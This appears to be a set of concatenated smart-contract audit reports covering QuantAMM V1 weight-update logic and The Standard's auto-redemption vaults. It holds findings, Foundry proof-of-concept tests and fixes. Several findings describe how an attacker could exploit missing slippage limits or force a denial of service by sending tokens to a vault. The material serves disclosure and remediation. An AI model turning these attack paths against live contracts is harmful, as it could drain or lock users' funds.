   + TimelockController public timelock;
   ```

3. **Alternative Solution:**
   Instead of using `QuantAMMBaseAdministration`, consider using the OpenZeppelin `TimelockController` contract directly as `quantammAdmin`. This approach streamlines the process and ensures timelock enforcement without redundant checks.

**QuantAMM:** Fixed in [`a299ce7`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/a299ce72076b58503386bc146b81014560536d9e)

**Cyfrin:** Verified. `QuantAMMBaseAdministration` is removed.


### Unauthorized role grants prevent `QuantAMMBaseAdministration` deployment

**Description:** `QuantAMMBaseAdministration` is a contract that manages certain break-glass features and facilitates calls to other QuantAMM contracts.

However, this contract fails to deploy due to an issue in the [`QuantAMMBaseAdministration` constructor](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMBaseAdministration.sol#L68-L74), where roles are granted to proposers and executors:

```solidity
for (uint256 i = 0; i < proposers.length; i++) {
    timelock.grantRole(timelock.PROPOSER_ROLE(), proposers[i]);
}

for (uint256 i = 0; i < executors.length; i++) {
    timelock.grantRole(timelock.EXECUTOR_ROLE(), executors[i]);
}
```
The issue arises because the `QuantAMMBaseAdministration` contract needs to have the `DEFAULT_ADMIN_ROLE` in the `timelock` contract for these `grantRole` calls to succeed. Since it does not possess this role, the calls will [revert](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v5.0/contracts/access/AccessControl.sol#L122-L124) with an `AccessControlUnauthorizedAccount` error.

**Impact:** The deployment of `QuantAMMBaseAdministration` will fail due to unauthorized role assignment, preventing the contract from being deployed successfully.

**Proof of Concept:** Add the following test file to the `pkg/pool-quantamm/test/foundry/` folder:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../../contracts/QuantAMMBaseAdministration.sol";

contract QuantAMMBaseAdministrationTest is Test {

    address daoRunner = makeAddr("daoRunner");

    address proposer = makeAddr("proposer");
    address executor = makeAddr("executor");

    QuantAMMBaseAdministration admin;

    function testSetupQuantAMMBaseAdministration() public {
        address[] memory proposers = new address[](1);
        proposers[0] = proposer;

        address[] memory executors = new address[](1);
        executors[0] = executor;

        vm.expectRevert(); // AccessControlUnauthorizedAccount(address(admin),DEFAULT_ADMIN_ROLE)
        admin = new QuantAMMBaseAdministration(
            daoRunner,
            1 hours,
            proposers,
            executors
        );
    }
}
```

**Recommended Mitigation:** Remove the role grants in the constructor, as these assignments are already handled in the `TimeLockController` [constructor]((https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v5.0/contracts/governance/TimelockController.sol#L125-L133)):

**QuantAMM:** Fixed in [`a299ce7`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/a299ce72076b58503386bc146b81014560536d9e)

**Cyfrin:** Verified. `QuantAMMBaseAdministration` is removed.

\clearpage
## Low Risk


### `UpdateWeightRunner::performUpdate` reverts on underflow when new multiplier is zero

**Description:** In [`UpdateWeightRunner::_calculateMultiplerAndSetWeights`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L433-L504), the new multiplier is determined by calculating the [change in weight over time](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L447).

To protect against unexpected values, a "last valid timestamp" for the multiplier is calculated in the section [here](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L453-L485).

When there is no change in weight, the multiplier becomes zero. This scenario is handled by a special case in the following code:
```solidity
int256 currentLastInterpolationPossible = type(int256).max;

for (uint i; i < local.currentWeights.length; ) {
    // ...

    if (blockMultiplier > int256(0)) {
        weightBetweenTargetAndMax = upperGuardRail - local.currentWeights[i];
        // ...
        blockTimeUntilGuardRailHit = weightBetweenTargetAndMax / blockMultiplier;
    } else if (blockMultiplier == int256(0)) {
        blockTimeUntilGuardRailHit = type(int256).max; // @audit if blockMultiplier is 0 this is max
    } else {
        weightBetweenTargetAndMax = local.currentWeights[i] - local.absoluteWeightGuardRail18;
        // ...
        blockTimeUntilGuardRailHit = weightBetweenTargetAndMax / int256(uint256(-1 * blockMultiplier));
    }
    // ...
}
// ...

//next expected update + time beyond that
currentLastInterpolationPossible += int40(uint40(block.timestamp));
```
If the weights remain unchanged and the multiplier is `0`, `currentLastInterpolationPossible` is set to `type(int256).max`. Consequently, the statement `currentLastInterpolationPossible += int40(uint40(block.timestamp))` will revert due to integer overflow.

The same overflow can also potentially happen if the multiplier is very small in the other branches as `weightBetweenTargetAndMax / blockMultiplier` could blow up.

**Impact:** Whenever the new multiplier is `0` (or extremely large), the call to `UpdateWeightRunner::performUpdate` will revert. This prevents updates from being executed when weights remain constant or under certain edge cases.

**Proof of Concept:** Add the following test to `pkg/pool-quantamm/test/foundry/UpdateWeightRunner.t.sol`:
```solidity
function testUpdatesFailsWhenMultiplierIsZero() public {
    vm.startPrank(owner);
    updateWeightRunner.setApprovedActionsForPool(address(mockPool), 3);
    vm.stopPrank();
    int256[] memory initialWeights = new int256[](4);
    initialWeights[0] = 0;
    initialWeights[1] = 0;
    initialWeights[2] = 0;
    initialWeights[3] = 0;

    // Set initial weights
    mockPool.setInitialWeights(initialWeights);

    int216 fixedValue = 1000;
    chainlinkOracle = deployOracle(fixedValue, 3601);

    vm.startPrank(owner);
    updateWeightRunner.addOracle(OracleWrapper(chainlinkOracle));
    vm.stopPrank();

    vm.startPrank(address(mockPool));

    address[][] memory oracles = new address[][](1);
    oracles[0] = new address[](1);
    oracles[0][0] = address(chainlinkOracle);

    uint64[] memory lambda = new uint64[](1);
    lambda[0] = 0.0000000005e18;
    updateWeightRunner.setRuleForPool(
        IQuantAMMWeightedPool.PoolSettings({
            assets: new IERC20[](0),
            rule: IUpdateRule(mockRule),
            oracles: oracles,
            updateInterval: 1,
            lambda: lambda,
            epsilonMax: 0.2e18,
            absoluteWeightGuardRail: 0.2e18,
            maxTradeSizeRatio: 0.2e18,
            ruleParameters: new int256[][](0),
            poolManager: addr2
        })
    );
    vm.stopPrank();

    vm.startPrank(addr2);
    updateWeightRunner.InitialisePoolLastRunTime(address(mockPool), 1);
    vm.stopPrank();

    vm.warp(block.timestamp + 10000000);
    mockRule.CalculateNewWeights(
        initialWeights,
        new int256[](0),
        address(mockPool),
        new int256[][](0),
        new uint64[](0),
        0.2e18,
        0.2e18
    );
    vm.expectRevert();
    updateWeightRunner.performUpdate(address(mockPool));
}

```

**Recommended Mitigation:** Consider guarding against overflow:
```diff
  //next expected update + time beyond that
+ if(currentLastInterpolationPossible < int256(type(int40).max)) {
      currentLastInterpolationPossible += int40(uint40(block.timestamp));
+ }
```

**QuantAMM:** Fixed in [`9b7a998`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/9b7a998fca97fcb239c72d2cd762d9dc59e6ce8e)

**Cyfrin:** Verified. Overflow now prevented.


### Missing weight sum validation in `setWeightsManually` function

**Description:** The `UpdateWeightRunner::setWeightsManually` allows privileged users (DAO, pool manager, or admin based on pool registry) to manually set weights of the pool without validating if the weights sum to 1. This check is correctly enforced the first time when weights are initialized in `_setInitialWeights`:

```solidity
// In QuantAMMWeightedPool.sol - _setInitialWeights
// Ensure that the normalized weights sum to ONE
if (uint256(normalizedSum) != FixedPoint.ONE) {
    revert NormalizedWeightInvariant();
}
```

A similar validation is missing in setWeightsManually in UpdateWeightRunner.sol, creating an inconsistency in how weight validations are handled when weights are entered manually.


**Impact:** While this function is access controlled, allowing privileged users to set weights that don't sum to 1 could cause:

- Incorrect pool valuation
- Unfair trading due to miscalculated swap amounts

It is noteworthy that although `setInitialWeights` also has privileged access, weight sum check exists in that function.


**Recommended Mitigation:** Consider adding a weight sum validation in `setWeightsManually`


**QuantAMM:** In practice and in theory the weights do not have to sum to one. Trading is done on the ratio not the absolute values of the weights. Everyone does it but if you set it to 50/50 instead of 0.5/0.5 nothing would change in what swaps were accepted by the mathematics of the pool. Our general practice with break glass measures is to include no validation as which glass needs breaking could be an unknown unknown. However, we reviewed the potential issues and actually given we use fixed point math libs that expect 1>x>0 (especially greater than 0) it does make sense to add the check so really maybe just a change in description of the issue. We will not check guard rails as that could be a valid break glass in some strange unknown.

**Cyfrin:** Acknowledged.


### Extreme weight ratios combined with large balances can cause denial-of-service for unbalanced liquidity operations

**Description:** The weighted pool math can potentially overflow when making unbalanced liquidity adjustments to a pool tokens with very small weights and large balances.

The issue occurs in `WeightedMath::computeBalanceOutGivenInvariant`:

```solidity
 newBalance = oldBalance * (invariantRatio ^ (1/weight))
```

When weights are small and invariant ratio is close to the maximum value (300%), even realistic balance changes can cause computations to overflow.

An example here taken from the fuzz test:

```solidity
// Balance computation scenario:
balance = 7500e21  (7.5 million tokens)
weight = 0.01166 (1.166%) // Just above absoluteWeightGuardRail minimum of 1% proposed for Balancer pools
invariantRatio = 3.0 // maximum value

calculation = 7500e21 * (3.0 ^ (1/0.01166))
           = 7500e21 * (3.0 ^ 85.76)
           = OVERFLOW
```

`QuantAMMWeightedPool` allows weights down to `0.1 %`, as seen in `QuantAMMWeightedPool::_setRule`:
```solidity
//applied both as a max (1 - x) and a min, so it cant be more than 0.49 or less than 0.01
//all pool logic assumes that absolute guard rail is already stored as an 18dp int256
require(
    int256(uint256(_poolSettings.absoluteWeightGuardRail)) <
        PRBMathSD59x18.fromInt(1) / int256(uint256((_initialWeights.length))) &&
        int256(uint256(_poolSettings.absoluteWeightGuardRail)) > 0.001e18, // @audit minimum guard rail allowed is 0.1 %
    "INV_ABSWGT"
); //Invalid absoluteWeightGuardRail value
```

**Impact:** Liquidity operations can revert for tokens with small weights and large balances. As a consequence, pool can become temporarily unusable as weights approach guard rail minimums. It is worth highlighting that users can always choose to proportionately add/remove liquidity to mitigate this scenario.

**Recommended Mitigation:** Risk of overflow exists when the minimum weight can go up to 1%. Even a modest increase of minimum weight to 3% effectively prevents this scenario. Consider changing the lowest enforced guard rail to be higher.

**QuantAMM:** Response from the balancer team and we agree:

> computeBalance is only used for unbalanced liquidity ops (add single token exact out, or remove single token exact in).
Add exact out is only used in batch swaps. Remove exact in could be used if you want to exit single sided I guess.
But in any case you can always exit proportional

> The example above uses an invariant ratio of 3, which is an add liquidity (>1). Compute balance for that ratio only happens for add single token exact out. You won't ever use that one unless you nest your pools (which is not supported anyways by default for [quantamm] weighted pools).

1% enforced as lowest guard rail in [`4beffda`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/4beffda73e0c38b9dc719d78147c06f1d59644bd)

**Cyfrin:** Verified.

\clearpage
## Informational


### Use of solidity `assert` instead of foundry asserts in test suite

**Description:** In [`QuantAMMWeightedPool8Token`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/test/foundry/QuantAMMWeightedPool8Token.t.sol#L312) tests `assert` is used instead of foundry `assertEq`

Foundry [`assertEq`](https://book.getfoundry.sh/reference/forge-std/std-assertions) provides better error information when failing such as the two values compared. Consider using `assertEq` instead of solidity `assert`

**QuantAMM:** Fixed in [`414d4bc`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/414d4bc3d8699f1e4620f0060226b4e23ff3b010) and [`ca1e441`](https://github.com/QuantAMMProtocol/QuantAMM-V1/pull/27/commits/ca1e441d4feb2a1ffe202121857207f3e15fbc2f)

**Cyfrin:** Verified


### Consider adding a getter for `QuantAMMWeightedPool.poolDetails`

**Description:** [`QuantAMMWeightedPool.poolDetails`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L170) is a nested array:
```solidity
string[][] public poolDetails;
```
Nested array needs both indexes to access an element. To query for the whole array a custom getter would be needed. This could be useful for off-chain monitoring.

Reported by the protocol during audit.

**QuantAMM:** Fixed in [`ee1fbb8`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/ee1fbb8db9d113f04c0b99fe766800dc80cf1ff2)

**Cyfrin:** Verified.


### `AntimomentumUpdateRule.parameterDescriptions` initialized too long

**Description:** [`AntimomentumUpdateRule.parameterDescriptions`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/rules/AntimomentumUpdateRule.sol#L16-L18) is initialized as length 3 but only two entries are used:
```solidity
parameterDescriptions = new string[](3); // @audit should be 2
parameterDescriptions[0] = "Kappa: Kappa dictates the aggressiveness of response to a signal change TODO";
parameterDescriptions[1] = "Use raw price: 0 = use moving average, 1 = use raw price to be used as the denominator";
```
Consider initializing it as `new string[](2)`.

**QuantAMM:** Fixed in [`91241ca`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/91241ca9e72b8a4fc964cc2df34f5aeb82f7ca39)

**Cyfrin:** Verified.


###  `TODO`s left in rule parameter descriptions

**Description:** The three rules [`AntimomentumUpdateRule`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/rules/AntimomentumUpdateRule.sol#L17), [`MinimumVarianceUpdateRule`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/rules/MinimumVarianceUpdateRule.sol#L15) and [`MomentumUpdateRule`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/rules/MomentumUpdateRule.sol#L15) have `TODO`s left in their parameter descriptions.

Consider finalizing the descriptions of these parameters.

**QuantAMM:** Fixed in [`e3e0d5e`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/e3e0d5eab5f81d2141ce69daffb249c223385b2f), [`8c3a4f3`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/8c3a4f3df43ba8731808c226b2fe4eb68b3e7c8b), [`f56796e`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/f56796ee75615a28c14c3678d984d5b55d3cf864)

**Cyfrin:** Verified.


### Unnecessary `_initialWeights` sum check

**Description:** When first initializing a `QuantAMMWeightedPool` the pool creator provides the initial weights. These initial weights should sum up to 1 (`1e18`). The issue is however that this is verified both in [`QuantAMMWeightedPool::_setRule`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L767-L778):
```solidity
int256 sumWeights;
for (uint i; i < _initialWeights.length; ) {
    sumWeights += int256(_initialWeights[i]);
    unchecked {
        ++i;
    }
}

require(
    sumWeights == 1e18, // 1 for int32 sum
    "SWGT!=1"
); //Initial weights must sum to 1
```
And in [`QuantAMMWeightedPool::_setInitialWeights`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L625-L644):
```solidity
int256 normalizedSum;
int256[] memory _weightsAndBlockMultiplier = new int256[](_weights.length * 2);
for (uint i; i < _weights.length; ) {
    if (_weights[i] < int256(uint256(absoluteWeightGuardRail))) {
        revert MinWeight();
    }

    _weightsAndBlockMultiplier[i] = _weights[i];
    normalizedSum += _weights[i];
    //Initially register pool with no movement, first update will come and set block multiplier.
    _weightsAndBlockMultiplier[i + _weights.length] = int256(0);
    unchecked {
        ++i;
    }
}

// Ensure that the normalized weights sum to ONE
if (uint256(normalizedSum) != FixedPoint.ONE) {
    revert NormalizedWeightInvariant();
}
```
Consider removing the check in `_setRule` as that function is for verifying the rules and also the check in `_setInitialWeights` is more thorough, as it also checks they adhere to the `absoluteWeightGuardRail` requirement.

**QuantAMM:** Fixed in [`6b891e8`](https://github.com/QuantAMMProtocol/QuantAMM-V1/pull/36/commits/6b891e877f8dc1ec50b562d744c5fbb7c5f70eef)

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-12-17-cyfrin-quantamm-v1.2.md ------


------ FILE START car/reports_md/2024-12-18-cyfrin-the-standard-auto-redemption-v2.0.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

# Findings
## Critical Risk


### Hypervisor collateral redemption can cause vaults to become undercollateralized due to slippage

**Description:** When redeeming Hypervisor collateral, `SmartVaultV4::autoRedemption` performs a call to `SmartVaultYieldManager::quickWithdraw`:

```solidity
if (_hypervisor != address(0)) {
    address _yieldManager = ISmartVaultManager(manager).yieldManager();
    IERC20(_hypervisor).safeIncreaseAllowance(_yieldManager, getAssetBalance(_hypervisor));
    _withdrawn = ISmartVaultYieldManager(_yieldManager).quickWithdraw(_hypervisor, _collateralToken);
    IERC20(_hypervisor).forceApprove(_yieldManager, 0);
}
```

This invokes `SmartVaultYieldManager::_withdrawOtherDeposit` to withdraw the underlying collateral without applying the additional protocol withdrawal fee:

```solidity
function quickWithdraw(address _hypervisor, address _token) external returns (uint256 _withdrawn) {
    IERC20(_hypervisor).safeTransferFrom(msg.sender, address(this), IERC20(_hypervisor).balanceOf(msg.sender));
    _withdrawOtherDeposit(_hypervisor, _token);
    uint256 _withdrawn = _thisBalanceOf(_token);
    IERC20(_token).safeTransfer(msg.sender, _withdrawn);
}
```

After auto redemption is complete, the excess underlying collateral is redeposited to the Hypervisor through `SmartVaultV4::redeposit`:

```solidity
function redeposit(uint256 _withdrawn, uint256 _collateralBalance, address _hypervisor, address _collateralToken)
    private
{
    uint256 _redeposit = _withdrawn > _collateralBalance ? _collateralBalance : _withdrawn;
    address _yieldManager = ISmartVaultManager(manager).yieldManager();
    IERC20(_collateralToken).safeIncreaseAllowance(_yieldManager, _redeposit);
    ISmartVaultYieldManager(_yieldManager).quickDeposit(_hypervisor, _collateralToken, _redeposit);
    IERC20(_collateralToken).forceApprove(_yieldManager, 0);
}
```

This performs a call to `SmartVaultYieldManager::quickDeposit` which similarly invokes `SmartVaultYieldManager::_otherDeposit_` to deposit the underlying collateral without applying the additional protocol deposit fee:

```solidity
function quickDeposit(address _hypervisor, address _collateralToken, uint256 _deposit) external {
    IERC20(_collateralToken).safeTransferFrom(msg.sender, address(this), _deposit);
    HypervisorData memory _hypervisorData = hypervisorData[_collateralToken];
    _otherDeposit(_collateralToken, _hypervisorData);
}
```

The issue with this logic is that the `SmartVaultYieldManager` functions assume slippage is sufficiently handled by calling function:

```solidity
// within _withdrawOtherDeposit()
IHypervisor(_hypervisor).withdraw(
    _thisBalanceOf(_hypervisor), address(this), address(this), [uint256(0), uint256(0), uint256(0), uint256(0)]
);

// within _swapToSingleAsset(), called from within _withdrawOtherDeposit()
// similar is present within _buy() and _sell() called from within _otherDeposit() -> _swapToRatio()
ISwapRouter(uniswapRouter).exactInputSingle(
    ISwapRouter.ExactInputSingleParams({
        tokenIn: _unwantedToken,
        tokenOut: _wantedToken,
        fee: _fee,
        recipient: address(this),
        deadline: block.timestamp + 60,
        amountIn: _balance,
        amountOutMinimum: 0,
        sqrtPriceLimitX96: 0
    })
);

// within _deposit(), called from within _otherDeposit()
IUniProxy(uniProxy).deposit(
    _thisBalanceOf(_token0),
    _thisBalanceOf(_token1),
    msg.sender,
    _hypervisor,
    [uint256(0), uint256(0), uint256(0), uint256(0)]
);
```

The current logic assumes vaults cannot become undercollateralized as a result of auto redemption and performs no such validation; however, an attacker can cause a vault to become undercollateralized by taking advantage of the lack of slippage handling.

A collateralization check should be performed immediately after the execution of redeposit logic due to empty slippage parameters.

**Impact:** Auto redemption of Hypervisor collateral can result in undercollateralized vaults.

**Recommended Mitigation:** Add additional validation to prevent vaults from becoming undercollateralized as a result of auto redemption.

**The Standard DAO:** Fixed by commit [b71beb0](https://github.com/the-standard/smart-vault/commit/b71beb03aef660f5f7cedcde88167e816111f283).

**Cyfrin:** This prevents the new `SmartVaultV4` with Hypervisor deposits from becoming undercollateralized due to auto redemption, however this does not prevent a significant collateral drawdown to just above the liquidation threshold. As an aside, we should probably also validate that auto redemption is not trying to swap collateral for a vault that is already undercollateralized but not liquidated  prefer a significant drawdown check here instead.

**The Standard DAO:** Fixed by commits [b92c98c](https://github.com/the-standard/smart-vault/commit/b92c98c4217aa566c5e2007f8fdcb9804e200ec9), [cd6bd7c](https://github.com/the-standard/smart-vault/commit/cd6bd7c612ce1476b9aa0f4b01593be0d8b32e82), and [132a013](https://github.com/the-standard/smart-vault/commit/132a0138e3e586493dcd25bfb1b56e1c761f95c2).

**Cyfrin:** The collateral percentage runtime invariant check has been added; however, the case where vault debt is fully repaid needs to be handled explicitly to avoid division by zero in `SmartVaultV4::calculateCollaralPercentage`.

**The Standard DAO:** Fixed by commit [aa4d5df](https://github.com/the-standard/smart-vault/commit/aa4d5dfb115a3962f7edcc1fa813b67c3d6950f2).

**Cyfrin:** Verified. The collateral percentage validation will no longer execute if `minted` is zero.


### Vaults can be made erroneously liquidatable due to incorrect swap path

**Description:** When auto redemption is executed, the `Quoter::quoteExactOutput` and `Quoter::quoteExactInput` functions of the [Uniswap v3 view-only quoter](https://github.com/Uniswap/view-quoter-v3/tree/master) are invoked for legacy and non-legacy vaults respectively. Given that these calls do not revert, execution will proceed to performing the swap; however, the swap path of `collateral -> USDC` is incorrect when attempting to swap to `USDs`:

```solidity
_amountOut = ISwapRouter(_swapRouterAddress).exactInput(
    ISwapRouter.ExactInputParams({
        path: _swapPath,
        recipient: address(this),
        deadline: block.timestamp,
        amountIn: _collateralAmount,
        // minimum amount out should be at least usd value of collateral being swapped in
        amountOutMinimum: calculator.tokenToUSD(
            ITokenManager(ISmartVaultManager(manager).tokenManager()).getTokenIfExists(_collateralAddr),
            _collateralAmount
        )
    })
);
```

The swap will succeed, converting the collateral to `USDC`, but no debt will be redeemed as the `USDs` balance of the vault has not changed:

```solidity
uint256 _usdsBalance = USDs.balanceOf(address(this));
minted -= _usdsBalance;
USDs.burn(address(this), _usdsBalance);
```

Given that `USDC` is not a valid collateral token, this will result in the vault becoming liquidatable if a sufficient amount of the collatetal token is swapped.

**Impact:** Vaults can become erroneously liquidatable as a result of auto redemption.

**Recommended Mitigation:** Ensure that the swap path is correct when performing auto redemption and add a check to ensure that the vault collateralization has not significantly decreased as a result of auto redemption.

**The Standard DAO:** Fixed by commits [3c5e136](https://github.com/the-standard/smart-vault/commit/3c5e136cdab97d88e7aa79c23ee18e50d46d6276), [821bb26](https://github.com/the-standard/smart-vault/commit/132a0138e3e586493dcd25bfb1b56e1c761f95c2#diff-821bb262cfd79a7edc00f920efc390d9572957844594bc42733fc6e70f749e9a), and [132a013](https://github.com/the-standard/smart-vault/commit/132a0138e3e586493dcd25bfb1b56e1c761f95c2). Since we are storing both input and output swap paths, we use that to more efficiently calculate the required amount to swap.

**Cyfrin:** Verified. With the introduction of the `SwapPath` struct containing both input and output paths along with the relevant swap path and target amount variables renamed to correctly reference `USDs` instead of `USDC`, this now appears to be correct so long as paths are configured as communicated (e.g. input: `WETH -> USDC -> USDs`, output: `USDs -> USDC -> WETH`).

\clearpage
## High Risk


### `AutoRedemption` mappings are not and can never be populated

**Description:** The following mappings are declared within the `AutoRedemption` contract:

```solidity
mapping(address => address) hypervisorCollaterals;
mapping(address => bytes) swapPaths;
```

However, they are never populated and there are no public functions capable of doing so either.

When a request is triggered, `lastRequestId` is assigned a non-zero identifier:

```solidity
 lastRequestId = _sendRequest(req.encodeCBOR(), subscriptionID, MAX_REQ_GAS, donID);
```

But the execution of `AutoRedemption::fulfillRequest` will revert due to empty swap paths, so the `lastRequestId` storage will not be reset:

```solidity
bytes memory _collateralToUSDCPath = swapPaths[_token];
...
lastRequestId = bytes32(0);
```

Given the condition within `AutoRedemption::performUpkeep` that there must not be an existing unfulfilled request when creating a new one, this completely blocks all functionality and necessitates a complete redeployment.

**Impact:** Core auto redemption functionality will be broken for all vaults and cannot be fixed without redeployment.

**Recommended Mitigation:** Either:
* Pre-populate the mappings,
* Add access-controlled setter functions, or
* Query state from the `SmartVaultYieldManager` contract.

**The Standard DAO:** Fixed by commit [d72cdce](https://github.com/the-standard/smart-vault/commit/d72cdceed7d60c30abf329e1b8338bb5b13bca2b).

**Cyfrin:** Verified. The setter functions have been added.


### Auto redemption logic can be abused by an attacker due to insufficient access control

**Description:** `AutoRedemption::performUpkeep` is exposed for use by the Chainlink Automation DON when upkeep is required:

```solidity
function performUpkeep(bytes calldata performData) external {
    if (lastRequestId == bytes32(0)) {
        triggerRequest();
    }
}
```

However, there is an absence of access control that allows the function to be called by an address. Since `lastRequestId` is reset to `bytes32(0)` at the end of `AutoRedemption::fulfillRequest` execution, this means that upkeep can be repeatedly performed after the previous one has succeeded, regardless the trigger condition.

If `AutoRedemption::fulfillRequest` reverts, the `lastRequestId` state will not be reset which completely blocks all future auto redemptions due to the conditional in `AutoRedemption::performUpkeep` shown above. Combined with the use of `ERC20::balanceOf` within both `SmartVaultV4Legacy::autoRedemption` and `SmartVaultV4::autoRedemption` to determine the amount `USDs` repaid, an attacker can force this DoS condition by sending a small amount of `USDs` directly to the target vault:

```solidity
uint256 _usdsBalance = USDs.balanceOf(address(this));
minted -= _usdsBalance;
```

This causes the vault balance to be inflated above the expected maximum `minted` amount and execution to revert due to underflow. Since the Chainlink Functions DON will not retry failed fulfilment, there will be no way to reset the state and recover core functionality without complete redeployment.

**Impact:** An attacker can repeatedly trigger auto redemption regardless of the trigger condition and without relying on price oracle manipulation. This could amount to a loss of funds to the protocol since the Chainlink subscription will be billed on every fraudulent fulfilment attempt. Alternatively, an attacker could completely block functionality of the auto redemption mechanism if fulfilment is made to revert.

**Recommended Mitigation:** * Re-check the trigger condition within `AutoRedemption::performUpkeep` and also consider adding [access control](https://docs.chain.link/chainlink-automation/guides/forwarder).
* Calculate the amount of `USDs` repaid as the balance diff rather than using the vault balance directly.

**The Standard DAO:** Fixed by commit [5ec532e](https://github.com/the-standard/smart-vault/commit/5ec532e5f3813a865102501dbb91cf13a0813930).

**Cyfrin:** The trigger condition is re-checked and a TWAP has been implemented, however:
* It is recommended to use a substantially large interval (at least 900 seconds, if not 1800 seconds) to protect against manipulation. Note: Uniswap V3 pool oracles are not multi-block MEV resistant.
* The `USDs` repayment amount calculation has not been modified to use balance diffs instead of direct `balanceOf()`.

**The Standard DAO:** Fixed by commit [a8cdc77](https://github.com/the-standard/smart-vault/commit/a8cdc77d1fac9817128e1f3c1c8a1ab57f715513), using the amount out of the swap rather than balance checks.

**Cyfrin:** Verified. The TWAP interval has been increased and the redeemed amount has been modified to use the value output from the swap.


### `AutoRedemption::fulfillRequest` should never be allowed to revert

**Description:** Given that the Chainlink Functions DON will not retry failed fulfilments, `AutoRedemption::fulfillRequest` should never be allowed to revert; otherwise, `lastRequestId` will not be reset to `bytes32(0)` which means `AutoRedemption::performUpkeep` will never be able to trigger new requests.

Currently, inline comments suggest that there is an intention to revert if the Chainlink Functions DON returns an error; however, this should be avoided for the reason explained above. Similarly, any potential malformed response or reverts caused by external calls should be handled gracefully and fall through to this line:

```solidity
lastRequestId = bytes32(0);
```

**Impact:** Complete DoS of the auto redemption functionality.

**Recommended Mitigation:** * Do __not__ revert if an error is reported.
* Validate the response against its expected length to ensure that the decoding does not revert.
* Handle reverts from all external calls using `try/catch` blocks.
* Short-circuit if `AutoRedemption::calculateUSDsToTargetPrice` returns `0` (since this will cause the swap to [revert](https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#L603)).
* Optionally add an access-controlled admin function to reset `lastRequestId`.

**The Standard DAO:** Fixed by commit [5235524](https://github.com/the-standard/smart-vault/commit/523552498edefe77aa2782d2a887bb1980cf80b9).

**Cyfrin:** Verified. The response length is now validated against its expected length, which will also result in the logic being skipped if an error is reported. `AutoRedemption::runAutoRedemption` will only run if the target `USDs` amount is non-zero and other reverts from external calls are handled using `try/catch` blocks. An admin function to forcibly reset `lastRequestId` has not been added.


### Auto redemption functionality broken by incorrect address passed to `SmartVaultV4::autoRedemption`

**Description:** `SmartVaultV4::autoRedemption` has the following signature:

```solidity
function autoRedemption(
    address _swapRouterAddress,
    address _quoterAddress,
    address _collateralToken,
    bytes memory _swapPath,
    uint256 _USDCTargetAmount,
    address _hypervisor
)
```

However the invocation in `AutoRedemption::fulfillRequest` incorrectly passes the vault address in place of the swap router address:

```solidity
IRedeemable(_smartVault).autoRedemption(
    _smartVault, quoter, _token, _collateralToUSDCPath, _USDsTargetAmount, _hypervisor
);
```

**Impact:** Auto redemption functionality will become completely broken when attempting to repay the debt of a non-legacy vault.

**Recommended Mitigation:** Pass the correct swap router address stored in the `SmartVaultManagerV6` contract.

**The Standard DAO:** Fixed by commit [4400e25](https://github.com/the-standard/smart-vault/commit/4400e25c87880b7ab1b5d19fbe520e4db5b70122).

**Cyfrin:** Verified. The correct `swapRouter` address is now passed.

\clearpage
## Medium Risk


### Chainlink Functions HTTP request is missing authentication

**Description:** The `source` constant defined within `AutoRedemption` is used to execute the corresponding JavaScript code within the Chainlink Functions DON; however, the target API endpoint is exposed without any form of authentication which allows any observer to send requests.

**Impact:** A coordinated DDoS attack on the API endpoint could result in the server going down. This will cause requests to fail, meaning the Chainlink subscription will be billed but the auto redemption peg mechanism will not function as intended.

**Recommended Mitigation:** At a minimum, implement rate limiting. Preferably add authentication to the request using [Chainlink Functions secrets](https://docs.chain.link/chainlink-functions/resources/secrets).

**The Standard DAO:** Partially fixed by adding rate limiting to the API. Will also consider later adding an encrypted secret to the request.

